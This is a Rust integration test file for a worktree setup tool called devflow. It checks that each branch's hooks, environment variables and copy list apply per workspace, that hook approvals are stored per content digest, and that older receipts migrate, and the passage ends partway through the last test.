//! Each workspace runs the recipes (hooks, `[env]`, copy list) of its own
//! branch, and approvals are kept per digest: worktrees whose files differ no
//! longer revoke each other's approval.
//!
//! Real Git repositories in temporary directories; nothing here needs Docker,
//! PostgreSQL or pitchfork.
use devflow_core::effective::{ChoiceChange, ProblemKind, RecipesSource};
use devflow_core::receipt::{Phase, PhaseState, Receipt, Status};
use devflow_core::remedy::Remedy;
use devflow_core::setup::{self, CreateRequest, NoProgress, SetupOptions, SetupOutcome};
use devflow_core::worktree::{self, Workspace};
use devflow_core::{Project, doctor, env_file, trust};
use std::path::{Path, PathBuf};
use std::sync::{Once, OnceLock};

/// Process-wide state directories. Every test has its own random project id,
/// so sharing one trust file does not couple tests.
fn init() {
    static ONCE: Once = Once::new();
    static DIR: OnceLock<tempfile::TempDir> = OnceLock::new();
    ONCE.call_once(|| {
        let dir = DIR.get_or_init(|| tempfile::tempdir().unwrap());
        // SAFETY: runs once, before any test body touches the environment.
        unsafe {
            std::env::set_var("DEVFLOW_CONFIG_DIR", dir.path().join("config"));
            std::env::set_var("DEVFLOW_DATA_DIR", dir.path().join("data"));
            std::env::set_var("PITCHFORK_STATE_DIR", dir.path().join("pf-state"));
            std::env::set_var("PITCHFORK_CONFIG_DIR", dir.path().join("pf-config"));
            std::env::set_var("PITCHFORK_LOGS_DIR", dir.path().join("pf-logs"));
            std::env::remove_var("DEVFLOW_TRUST_HOOKS");
            std::env::remove_var("DEVFLOW_INSTANCE_ID");
        }
    });
}

struct Repo {
    _dir: tempfile::TempDir,
    root: PathBuf,
    id: uuid::Uuid,
    project: Project,
    /// The commit before `devflow.toml` existed.
    before_devflow: String,
}

fn commit_all(dir: &Path, message: &str) -> git2::Oid {
    let repo = git2::Repository::open(dir).unwrap();
    let mut index = repo.index().unwrap();
    index
        .add_all(["*"], git2::IndexAddOption::DEFAULT, None)
        .unwrap();
    index.write().unwrap();
    let tree = repo.find_tree(index.write_tree().unwrap()).unwrap();
    let parent = repo.head().ok().and_then(|h| h.peel_to_commit().ok());
    let parents: Vec<_> = parent.iter().collect();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    repo.commit(Some("HEAD"), &sig, &sig, message, &tree, &parents)
        .unwrap()
}

fn config(id: uuid::Uuid, extra: &str) -> String {
    format!("[project]\nname = \"shop\"\nid = \"{id}\"\n\n{extra}")
}

/// A repository `shop` on `main`: a first commit with a README alone, then one
/// that adds `devflow.toml` with `extra` after `[project]`.
fn repo(extra: &str) -> Repo {
    init();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap().join("shop");
    std::fs::create_dir_all(&root).unwrap();
    let mut options = git2::RepositoryInitOptions::new();
    options.initial_head("main");
    git2::Repository::init_opts(&root, &options).unwrap();
    std::fs::write(root.join("README.md"), "shop\n").unwrap();
    std::fs::write(
        root.join(".gitignore"),
        ".env\nnode_modules/\ndevflow.local.toml\n",
    )
    .unwrap();
    let before = commit_all(&root, "before devflow");
    let id = uuid::Uuid::new_v4();
    std::fs::write(root.join("devflow.toml"), config(id, extra)).unwrap();
    commit_all(&root, "devflow");
    std::fs::write(root.join(".env"), "SECRET=1\n").unwrap();
    let project = Project::open(&root).unwrap();
    Repo {
        _dir: dir,
        root,
        id,
        project,
        before_devflow: before.to_string(),
    }
}

fn create(
    project: &Project,
    name: &str,
    base: Option<&str>,
    options: SetupOptions,
) -> SetupOutcome {
    setup::create(
        project,
        CreateRequest {
            name: name.into(),
            from: None,
            base: base.map(str::to_string),
            options,
        },
        &mut NoProgress,
    )
    .unwrap()
}

fn setup_again(project: &Project, ws: &Workspace, options: SetupOptions) -> SetupOutcome {
    setup::setup(project, ws, options, false, false, &mut NoProgress)
        .unwrap()
        .expect("setup ran")
}

/// Approve the scope of `ws` as it is now.
fn approve(project: &Project, ws: &Workspace) {
    let scope = trust::scope_at(project, &ws.path);
    trust::approve_scope_at(project, &ws.path, &scope).unwrap();
}

fn state(project: &Project, ws: &Workspace) -> trust::TrustState {
    trust::state_at(project, &ws.path).unwrap()
}

/// Replace the file `name` of a workspace and commit it there.
fn write_in(ws: &Workspace, name: &str, text: &str) {
    std::fs::write(ws.path.join(name), text).unwrap();
    commit_all(&ws.path, &format!("edit {name}"));
}

/// Rewrite the receipt of `ws` as it was before recipes were per workspace: none
/// of the fields this change added.
fn as_an_earlier_devflow_wrote_it(ws: &Workspace) {
    let path = Receipt::path(&ws.git_dir);
    let mut json: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    let map = json.as_object_mut().unwrap();
    map.remove("hooks_generation");
    map.remove("default_recipes");
    map.remove("workspace_recipes");
    std::fs::write(&path, serde_json::to_vec_pretty(&json).unwrap()).unwrap();
    let read = receipt_of(ws);
    assert!(read.hooks_generation.is_none() && read.default_recipes.is_none());
    assert!(!read.workspace_recipes);
}

fn receipt_of(ws: &Workspace) -> Receipt {
    Receipt::load(&ws.git_dir).unwrap().expect("receipt")
}

fn status_of(project: &Project, ws: &Workspace) -> Option<Status> {
    setup::list(project)
        .unwrap()
        .into_iter()
        .find(|item| item.workspace.path == ws.path)
        .and_then(|item| item.status)
}

fn env_map(ws: &Workspace) -> std::collections::HashMap<String, String> {
    env_file::read(&ws.path).unwrap().into_iter().collect()
}

const HOOKS_MAIN: &str = "[hooks]\nsetup = ['echo main >> .devflow/runs']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\n";

// --- approvals per digest --------------------------------------------------

#[test]
fn worktrees_with_other_hooks_and_pitchfork_files_are_both_approved() {
    let t = repo("[hooks]\nswitch = ['echo main']\n");
    let a = create(&t.project, "a", None, SetupOptions::default()).workspace;
    let b = create(&t.project, "b", None, SetupOptions::default()).workspace;

    // Each branch carries its own hooks and its own pitchfork file.
    write_in(
        &a,
        "devflow.toml",
        &config(t.id, "[hooks]\nswitch = ['echo a']\n"),
    );
    write_in(&a, "pitchfork.toml", "[daemons.alpha]\nrun = \"echo a\"\n");
    write_in(
        &b,
        "devflow.toml",
        &config(t.id, "[hooks]\nswitch = ['echo b']\n"),
    );
    write_in(&b, "pitchfork.toml", "[daemons.beta]\nrun = \"echo b\"\n");

    let (da, db) = (
        trust::digest_at(&t.project, &a.path),
        trust::digest_at(&t.project, &b.path),
    );
    assert_ne!(da, db, "different content, different scope");
    for ws in [&a, &b] {
        assert!(matches!(
            state(&t.project, ws),
            trust::TrustState::Untrusted { .. }
        ));
    }

    approve(&t.project, &a);
    approve(&t.project, &b);
    assert_eq!(state(&t.project, &a), trust::TrustState::Trusted);
    assert_eq!(
        state(&t.project, &b),
        trust::TrustState::Trusted,
        "approving the second worktree did not revoke the first"
    );

    // The main checkout's own scope is a third one, approved apart.
    let main = worktree::list(&t.project).unwrap().remove(0);
    assert!(matches!(
        state(&t.project, &main),
        trust::TrustState::Untrusted {
            previously_trusted: true,
            ..
        }
    ));
    trust::approve(&t.project).unwrap();
    assert_eq!(state(&t.project, &main), trust::TrustState::Trusted);
    assert_eq!(state(&t.project, &a), trust::TrustState::Trusted);
    assert_eq!(state(&t.project, &b), trust::TrustState::Trusted);
    assert_eq!(trust::approvals(&t.project).unwrap().len(), 3);

    // Approving the same content again changes nothing.
    approve(&t.project, &a);
    assert_eq!(trust::approvals(&t.project).unwrap().len(), 3);

    // `trust --revoke` is the current scope's alone; `--revoke-all` is the project's.
    assert!(trust::revoke_at(&t.project, &a.path).unwrap());
    assert!(!trust::revoke_at(&t.project, &a.path).unwrap());
    assert!(matches!(
        state(&t.project, &a),
        trust::TrustState::Untrusted {
            previously_trusted: true,
            ..
        }
    ));
    assert_eq!(state(&t.project, &b), trust::TrustState::Trusted);
    assert_eq!(trust::revoke_all(&t.project).unwrap(), 2);
    assert!(matches!(
        state(&t.project, &b),
        trust::TrustState::Untrusted {
            previously_trusted: false,
            ..
        }
    ));
}

#[test]
fn a_worktree_with_the_main_checkouts_recipes_has_the_digest_it_always_had() {
    let t = repo(HOOKS_MAIN);
    let w = create(&t.project, "same", None, SetupOptions::default()).workspace;
    assert_eq!(
        trust::digest_at(&t.project, &w.path),
        trust::digest(&t.project),
        "recipes equal, pitchfork files equal: nobody approves again after upgrading"
    );
    trust::approve(&t.project).unwrap();
    assert_eq!(state(&t.project, &w), trust::TrustState::Trusted);
}

// --- a branch without recipes ---------------------------------------------

#[test]
fn a_branch_without_devflow_toml_needs_a_choice_and_then_runs_the_default_recipes() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();

    // The branch starts before devflow.toml existed.
    let out = create(
        &t.project,
        "old",
        Some(&t.before_devflow),
        SetupOptions::default(),
    );
    let ws = out.workspace.clone();
    assert!(!ws.path.join("devflow.toml").exists());
    assert_eq!(out.status, Status::NeedsAttention);
    match &out.recipes.source {
        RecipesSource::Unavailable { because } => assert_eq!(because.kind, ProblemKind::Missing),
        other => panic!("{other:?}"),
    }
    // The typed remedy comes first, then setup again; never "review".
    assert_eq!(
        out.remedies.first(),
        Some(&Remedy::UseDefaultRecipes {
            workspace: ws.path.clone()
        }),
        "{:?}",
        out.remedies
    );
    assert!(
        !out.remedies
            .iter()
            .any(|r| matches!(r, Remedy::Trust { .. }))
    );
    for phase in [Phase::Payload, Phase::Env, Phase::Hooks] {
        let record = out.receipt.phase(phase);
        assert!(
            record.state == PhaseState::Skipped && record.required_skip,
            "{phase:?}: {record:?}"
        );
        assert!(
            record.detail.as_deref().unwrap().contains("no recipes"),
            "{record:?}"
        );
    }
    assert_eq!(out.receipt.default_recipes, None, "nothing was chosen");
    // Nothing of the main checkout's recipes ran, was copied or exported.
    assert!(!ws.path.join(".devflow/runs").exists());
    assert!(!ws.path.join(".env").exists());
    let env = env_map(&ws);
    assert!(
        env.contains_key("DEVFLOW_WORKSPACE"),
        "generated variables are written"
    );
    assert!(!env.contains_key("FROM_MAIN"), "{env:?}");
    assert_eq!(status_of(&t.project, &ws), Some(Status::NeedsAttention));
    assert!(
        out.remedies_text().is_empty(),
        "core messages hold no command line"
    );

    // The person chooses the default workspace's recipes.
    let out = setup_again(
        &t.project,
        &ws,
        SetupOptions {
            use_default_recipes: true,
            ..Default::default()
        },
    );
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(matches!(
        out.recipes.source,
        RecipesSource::DefaultChosen { .. }
    ));
    assert_eq!(out.recipes.choice, Some(ChoiceChange::Recorded));
    assert!(out.receipt.default_recipes.is_some());
    assert_eq!(env_map(&ws)["FROM_MAIN"], "1");
    assert_eq!(
        std::fs::read_to_string(ws.path.join(".devflow/runs")).unwrap(),
        "main\n"
    );
    assert_eq!(
        std::fs::read_to_string(ws.path.join(".env")).unwrap(),
        "SECRET=1\n"
    );

    // The choice is remembered: the next run needs no flag, and runs nothing again.
    let again = setup_again(&t.project, &ws, SetupOptions::default());
    assert_eq!(again.status, Status::Ready);
    assert_eq!(again.recipes.choice, None);
    assert!(again.receipt.default_recipes.is_some());
    assert_eq!(status_of(&t.project, &ws), Some(Status::Ready));

    // The branch gains a valid file of its own: its recipes apply, the choice is
    // cleared and the result says so.
    write_in(
        &ws,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['echo own >> .devflow/runs']\n\n[env]\nFROM_BRANCH = \"1\"\n",
        ),
    );
    assert_eq!(
        status_of(&t.project, &ws),
        Some(Status::NeedsAttention),
        "its own recipes are not the ones that were set up"
    );
    approve(&t.project, &ws);
    let out = setup_again(&t.project, &ws, SetupOptions::default());
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(matches!(
        out.recipes.source,
        RecipesSource::Workspace { .. }
    ));
    assert_eq!(out.recipes.choice, Some(ChoiceChange::Cleared));
    assert_eq!(out.receipt.default_recipes, None);
    assert!(
        out.warnings.iter().any(|w| w.contains("choice")),
        "{:?}",
        out.warnings
    );
    let env = env_map(&ws);
    assert_eq!(env["FROM_BRANCH"], "1");
    assert!(!env.contains_key("FROM_MAIN"), "{env:?}");
    assert!(
        std::fs::read_to_string(ws.path.join(".devflow/runs"))
            .unwrap()
            .ends_with("own\n")
    );
}

#[test]
fn a_choice_made_while_the_branch_has_a_valid_file_changes_nothing() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    let ws = create(&t.project, "fine", None, SetupOptions::default()).workspace;
    let out = setup_again(
        &t.project,
        &ws,
        SetupOptions {
            use_default_recipes: true,
            ..Default::default()
        },
    );
    assert!(matches!(
        out.recipes.source,
        RecipesSource::Workspace { .. }
    ));
    assert_eq!(out.receipt.default_recipes, None, "nothing to choose here");
}

#[test]
fn an_invalid_file_or_another_projects_id_is_the_same_explicit_condition() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();

    // Invalid: the strict parser refuses an unknown key, naming the key path.
    let bad = create(&t.project, "bad", None, SetupOptions::default()).workspace;
    write_in(
        &bad,
        "devflow.toml",
        &config(t.id, "[hooks]\nsetup = ['x']\nnot_a_key = 1\n"),
    );
    let at = t.project.at(&bad.path);
    match at.recipes() {
        RecipesSource::Unavailable { because } => {
            assert_eq!(because.kind, ProblemKind::Invalid);
            assert!(because.message.contains("not_a_key"), "{}", because.message);
            assert_eq!(because.file, bad.path.join("devflow.toml"));
        }
        other => panic!("{other:?}"),
    }
    assert!(
        at.config.hooks.setup.is_empty(),
        "nothing of main's applies"
    );
    assert_eq!(status_of(&t.project, &bad), Some(Status::NeedsAttention));

    // Another project's id.
    let other = create(&t.project, "other", None, SetupOptions::default()).workspace;
    write_in(
        &other,
        "devflow.toml",
        &config(uuid::Uuid::new_v4(), "[hooks]\nsetup = ['x']\n"),
    );
    match t.project.at(&other.path).recipes() {
        RecipesSource::Unavailable { because } => {
            assert_eq!(because.kind, ProblemKind::OtherProject)
        }
        other => panic!("{other:?}"),
    }
    assert_eq!(status_of(&t.project, &other), Some(Status::NeedsAttention));

    // A 0.x file is a condition too, never read as 1.0.
    let old = create(&t.project, "old-style", None, SetupOptions::default()).workspace;
    std::fs::remove_file(old.path.join("devflow.toml")).unwrap();
    std::fs::write(old.path.join(".devflow.yml"), "postgres: {}\n").unwrap();
    match t.project.at(&old.path).recipes() {
        RecipesSource::Unavailable { because } => assert_eq!(because.kind, ProblemKind::Legacy),
        other => panic!("{other:?}"),
    }

    // The remedy works for each of them: the default recipes apply.
    let out = setup_again(
        &t.project,
        &bad,
        SetupOptions {
            use_default_recipes: true,
            ..Default::default()
        },
    );
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(out.receipt.default_recipes.is_some());
}

#[test]
fn a_branch_cannot_opt_into_the_native_checkout_and_the_local_choice_reaches_every_workspace() {
    use devflow_core::config::CheckoutBackend;
    let t = repo(HOOKS_MAIN);
    let quiet = create(&t.project, "quiet", None, SetupOptions::default()).workspace;
    let optin = create(&t.project, "optin", None, SetupOptions::default()).workspace;

    // A branch's committed file that sets the key is the same explicit
    // condition as an invalid file, naming the key and who may set it: it is
    // never read, so it opts nobody in and none of its recipes run.
    write_in(
        &optin,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['x']\n[worktree]\ncheckout = \"git\"\n",
        ),
    );
    let at = t.project.at(&optin.path);
    match at.recipes() {
        RecipesSource::Unavailable { because } => {
            assert_eq!(because.kind, ProblemKind::Invalid);
            assert!(
                because.message.contains("worktree.checkout")
                    && because.message.contains("devflow.local.toml"),
                "{}",
                because.message
            );
            assert_eq!(because.file, optin.path.join("devflow.toml"));
        }
        other => panic!("{other:?}"),
    }
    assert_eq!(at.config.worktree.checkout, CheckoutBackend::Libgit2);
    assert!(at.config.hooks.setup.is_empty());
    assert_eq!(status_of(&t.project, &optin), Some(Status::NeedsAttention));
    // Choosing the default recipes does not read the key either.
    let chosen = t.project.resolve(&optin.path, true);
    assert!(matches!(
        chosen.recipes(),
        RecipesSource::DefaultChosen { .. }
    ));
    assert_eq!(chosen.config.worktree.checkout, CheckoutBackend::Libgit2);
    assert_eq!(t.project.config.worktree.checkout, CheckoutBackend::Libgit2);

    // The machine-local choice is the main checkout's and is every
    // workspace's, whatever file the branch carries.
    std::fs::write(
        t.root.join("devflow.local.toml"),
        "[worktree]\ncheckout = \"git\"\n",
    )
    .unwrap();
    let project = Project::open(&t.root).unwrap();
    assert_eq!(project.config.worktree.checkout, CheckoutBackend::Git);
    assert_eq!(
        project.at(&quiet.path).config.worktree.checkout,
        CheckoutBackend::Git
    );
    assert_eq!(
        project.at(&optin.path).config.worktree.checkout,
        CheckoutBackend::Git,
        "the shared sections come from the main checkout, even while the branch's file is unusable"
    );
}

// --- generations -----------------------------------------------------------

#[test]
fn a_branchs_own_setup_hooks_reopen_that_workspace_only() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    let a = create(&t.project, "a", None, SetupOptions::default()).workspace;
    let b = create(&t.project, "b", None, SetupOptions::default()).workspace;
    assert_eq!(status_of(&t.project, &a), Some(Status::Ready));
    assert_eq!(status_of(&t.project, &b), Some(Status::Ready));

    // A's branch changes its setup hooks; the main checkout's hooks change too,
    // which reopens nothing in a workspace that has its own file.
    write_in(
        &a,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['echo a >> .devflow/runs']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\n",
        ),
    );
    std::fs::write(
        t.root.join("devflow.toml"),
        config(
            t.id,
            "[hooks]\nsetup = ['echo changed >> .devflow/runs']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\n",
        ),
    )
    .unwrap();
    let project = Project::open(&t.root).unwrap();
    assert_eq!(status_of(&project, &a), Some(Status::NeedsAttention));
    assert_eq!(
        status_of(&project, &b),
        Some(Status::Ready),
        "B's own file did not change: the main checkout's edit does not reach it"
    );
    let receipt = setup::receipt(&project, &a).unwrap().unwrap();
    assert!(receipt.phase(Phase::Hooks).required_skip);
    assert!(
        !receipt.phase(Phase::Env).required_skip,
        "only the hooks changed: the environment stands"
    );

    approve(&project, &a);
    let out = setup_again(&project, &a, SetupOptions::default());
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(
        std::fs::read_to_string(a.path.join(".devflow/runs")).unwrap(),
        "main\na\n"
    );
    assert_eq!(status_of(&project, &a), Some(Status::Ready));
}

#[test]
fn a_receipt_written_the_old_way_reopens_nothing_when_the_recipes_are_unchanged() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "legacy", None, SetupOptions::default()).workspace;
    assert_eq!(status_of(&t.project, &w), Some(Status::Ready));

    as_an_earlier_devflow_wrote_it(&w);

    assert_eq!(status_of(&t.project, &w), Some(Status::Ready));
    // Entering the workspace again asks nothing and runs no setup hook; it
    // adopts the generation of the hooks it has.
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.hooks.is_none(), "no setup hook ran again");
    assert!(out.repaired.is_empty());
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/runs")).unwrap(),
        "main\n"
    );
    assert!(receipt_of(&w).hooks_generation.is_some());
    // From then on a change to the hooks is seen.
    write_in(
        &w,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['echo again']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\n",
        ),
    );
    assert_eq!(status_of(&t.project, &w), Some(Status::NeedsAttention));
}

#[test]
fn an_approval_written_by_an_earlier_devflow_is_still_the_first_of_several() {
    let t = repo(HOOKS_MAIN);
    let w = create(&t.project, "feature", None, SetupOptions::default()).workspace;
    // The one-digest entry an earlier devflow wrote for the project.
    trust::approve(&t.project).unwrap();
    let config_dir = PathBuf::from(std::env::var_os("DEVFLOW_CONFIG_DIR").unwrap());
    let file = config_dir.join("trust.toml");
    let before = std::fs::read_to_string(&file).unwrap();
    let digest = trust::digest(&t.project);
    assert!(before.contains(&digest));

    // Nobody is asked again: the worktree has the same recipes.
    assert_eq!(state(&t.project, &w), trust::TrustState::Trusted);
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(
        !out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );

    // A worktree with other recipes adds a second approval; the first stays first.
    write_in(
        &w,
        "devflow.toml",
        &config(t.id, "[hooks]\nsetup = ['echo own']\n"),
    );
    approve(&t.project, &w);
    let after = std::fs::read_to_string(&file).unwrap();
    let first = after.find(&digest).expect("the old entry is still there");
    let second = after.find(&trust::digest_at(&t.project, &w.path)).unwrap();
    assert!(first < second, "{after}");
    assert_eq!(trust::approvals(&t.project).unwrap()[0].digest, digest);
}

// --- receipts written before recipes were per workspace ------------------------

#[test]
fn an_old_receipt_whose_branch_has_no_recipes_keeps_the_default_ones_and_says_so_once() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    // Before this change every workspace ran the main checkout's recipes, a
    // branch without a devflow.toml included.
    let ws = create(
        &t.project,
        "old",
        Some(&t.before_devflow),
        SetupOptions {
            use_default_recipes: true,
            ..Default::default()
        },
    )
    .workspace;
    assert!(!ws.path.join("devflow.toml").exists());
    assert_eq!(status_of(&t.project, &ws), Some(Status::Ready));
    as_an_earlier_devflow_wrote_it(&ws);
    let ran = || std::fs::read_to_string(ws.path.join(".devflow/runs")).unwrap();
    assert_eq!(ran(), "main\n");

    // It is not turned into `needs_attention`, and nobody is asked again: the
    // workspace reads as ready, with the default recipes, and the approval that
    // covered them still covers it.
    assert_eq!(status_of(&t.project, &ws), Some(Status::Ready));
    let listed = setup::list(&t.project).unwrap();
    let report = listed
        .iter()
        .find(|item| item.workspace.path == ws.path)
        .and_then(|item| item.recipes.clone())
        .unwrap();
    assert_eq!(report.source.label(), "default_chosen");
    assert_eq!(
        trust::digest_at(&t.project, &ws.path),
        trust::digest(&t.project)
    );
    assert_eq!(state(&t.project, &ws), trust::TrustState::Trusted);

    // The first run under the lock records the choice and reports it, once.
    let out = setup::activate(&t.project, &ws, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(out.recipes.choice, Some(ChoiceChange::Migrated));
    assert!(matches!(
        out.recipes.source,
        RecipesSource::DefaultChosen { .. }
    ));
    let said: Vec<_> = out
        .warnings
        .iter()
        .filter(|w| w.contains("as before"))
        .collect();
    assert_eq!(said.len(), 1, "{:?}", out.warnings);
    assert!(
        said[0].contains("until its branch has its own") && !said[0].contains("`devflow"),
        "{}",
        said[0]
    );
    assert!(out.hooks.is_none(), "no setup hook ran again");
    assert_eq!(ran(), "main\n");
    let receipt = receipt_of(&ws);
    assert!(receipt.default_recipes.is_some() && receipt.workspace_recipes);
    assert!(
        receipt
            .default_recipes
            .as_ref()
            .unwrap()
            .because
            .contains("before recipes were per workspace")
    );

    // Said once: the next run has nothing more to report about it.
    let again = setup::activate(&t.project, &ws, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(again.recipes.choice, None);
    assert!(
        !again.warnings.iter().any(|w| w.contains("as before")),
        "{:?}",
        again.warnings
    );
    assert_eq!(again.status, Status::Ready);

    // It ends when the branch has a valid file of its own.
    write_in(
        &ws,
        "devflow.toml",
        &config(t.id, "[hooks]\nsetup = ['echo own >> .devflow/runs']\n"),
    );
    approve(&t.project, &ws);
    let out = setup_again(&t.project, &ws, SetupOptions::default());
    assert_eq!(out.recipes.choice, Some(ChoiceChange::Cleared));
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
}

#[test]
fn an_old_receipt_whose_branch_has_other_valid_recipes_switches_to_its_own_once() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    let ws = create(&t.project, "own", None, SetupOptions::default()).workspace;
    assert_eq!(status_of(&t.project, &ws), Some(Status::Ready));
    // The branch carries recipes of its own that differ from the default's;
    // earlier devflow ran the default's here.
    write_in(
        &ws,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['echo own >> .devflow/runs']\n\n[env]\nFROM_BRANCH = \"1\"\n",
        ),
    );
    as_an_earlier_devflow_wrote_it(&ws);

    // It now runs its own recipes, which it was not set up under: env and
    // hooks reopen, once, and what they ask to run is approved apart.
    assert_eq!(status_of(&t.project, &ws), Some(Status::NeedsAttention));
    let receipt = setup::receipt(&t.project, &ws).unwrap().unwrap();
    assert!(receipt.phase(Phase::Env).required_skip);
    assert!(receipt.phase(Phase::Hooks).required_skip);
    assert!(
        matches!(state(&t.project, &ws), trust::TrustState::Untrusted { .. }),
        "its own scope is not the one that was approved"
    );
    approve(&t.project, &ws);
    let out = setup_again(&t.project, &ws, SetupOptions::default());
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(matches!(
        out.recipes.source,
        RecipesSource::Workspace { .. }
    ));
    assert_eq!(out.recipes.choice, None, "there was no choice to migrate");
    assert!(
        !out.warnings.iter().any(|w| w.contains("as before")),
        "{:?}",
        out.warnings
    );
    let env = env_map(&ws);
    assert_eq!(env["FROM_BRANCH"], "1");
    assert!(!env.contains_key("FROM_MAIN"), "{env:?}");
    assert_eq!(
        std::fs::read_to_string(ws.path.join(".devflow/runs")).unwrap(),
        "main\nown\n"
    );
    let receipt = receipt_of(&ws);
    assert!(receipt.workspace_recipes && receipt.default_recipes.is_none());
    assert_eq!(status_of(&t.project, &ws), Some(Status::Ready));
}

#[test]
fn a_new_receipt_in_the_condition_is_never_migrated_into_a_choice() {
    let t = repo(HOOKS_MAIN);
    let out = create(
        &t.project,
        "fresh",
        Some(&t.before_devflow),
        SetupOptions::default(),
    );
    assert_eq!(out.status, Status::NeedsAttention);
    assert!(out.receipt.workspace_recipes && out.receipt.default_recipes.is_none());
    // Setting it up again decides nothing for the person either.
    let again = setup_again(&t.project, &out.workspace, SetupOptions::default());
    assert_eq!(again.status, Status::NeedsAttention);
    assert_eq!(again.recipes.choice, None);
    assert!(receipt_of(&out.workspace).default_recipes.is_none());
}

#[test]
fn an_old_receipt_whose_branch_has_other_setup_hooks_has_not_run_them_and_runs_them_once() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    // Set up by an earlier devflow: it ran the default workspace's setup hook.
    let ws = create(&t.project, "own", None, SetupOptions::default()).workspace;
    let ran = || std::fs::read_to_string(ws.path.join(".devflow/runs")).unwrap();
    assert_eq!(ran(), "main\n");
    // Its branch carries other setup hooks; the environment, the services and
    // the copy list are the same as the default's.
    write_in(
        &ws,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['echo own >> .devflow/runs']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\n",
        ),
    );
    as_an_earlier_devflow_wrote_it(&ws);

    // Nothing records that they ran, and nothing pretends they did: the hooks
    // are open, and only they.
    assert_eq!(status_of(&t.project, &ws), Some(Status::NeedsAttention));
    let receipt = setup::receipt(&t.project, &ws).unwrap().unwrap();
    assert!(receipt.phase(Phase::Hooks).required_skip);
    assert!(
        receipt
            .phase(Phase::Hooks)
            .detail
            .as_deref()
            .unwrap()
            .contains("have not run here"),
        "{:?}",
        receipt.phase(Phase::Hooks)
    );
    for phase in [Phase::Payload, Phase::Services, Phase::Env] {
        assert!(!receipt.phase(phase).required_skip, "{phase:?}");
    }

    // `--if-new` does not skip it, and they are approved like any hooks: the
    // branch's scope is not the one on record.
    let if_new = |approve_first: bool| {
        if approve_first {
            approve(&t.project, &ws);
        }
        setup::setup(
            &t.project,
            &ws,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress,
        )
        .unwrap()
    };
    let waiting = if_new(false).expect("not skipped");
    assert_eq!(waiting.status, Status::NeedsAttention);
    assert_eq!(ran(), "main\n", "nothing ran unapproved");
    assert!(
        waiting
            .remedies
            .iter()
            .any(|r| matches!(r, Remedy::Trust { .. }))
    );
    let out = if_new(true).expect("not skipped");
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(ran(), "main\nown\n", "the branch's hooks ran, once");
    assert!(receipt_of(&ws).hooks_generation.is_some());

    // Once: nothing is skipped or run again afterwards, whichever way the
    // workspace is entered.
    assert!(if_new(false).is_none());
    let entered =
        setup::activate(&t.project, &ws, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(entered.status, Status::Ready);
    assert!(entered.hooks.is_none());
    assert_eq!(ran(), "main\nown\n");
    assert_eq!(status_of(&t.project, &ws), Some(Status::Ready));
}

#[test]
fn an_old_receipt_whose_setup_hooks_match_the_defaults_reopens_nothing() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    let ws = create(&t.project, "same", None, SetupOptions::default()).workspace;
    // The branch differs where the setup hooks do not: other switch and
    // teardown hooks, the same setup hooks, environment and copy list.
    write_in(
        &ws,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['echo main >> .devflow/runs']\nswitch = ['true']\nteardown = ['true']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\n",
        ),
    );
    as_an_earlier_devflow_wrote_it(&ws);
    assert_eq!(status_of(&t.project, &ws), Some(Status::Ready));
    let out = setup::setup(
        &t.project,
        &ws,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.is_none(), "nothing to set up");
    // They did run: the generation is adopted, so a later change is seen.
    assert!(receipt_of(&ws).hooks_generation.is_some());
    assert_eq!(
        std::fs::read_to_string(ws.path.join(".devflow/runs")).unwrap(),
        "main\n"
    );
    write_in(
        &ws,
        "devflow.toml",
        &config(
            t.id,
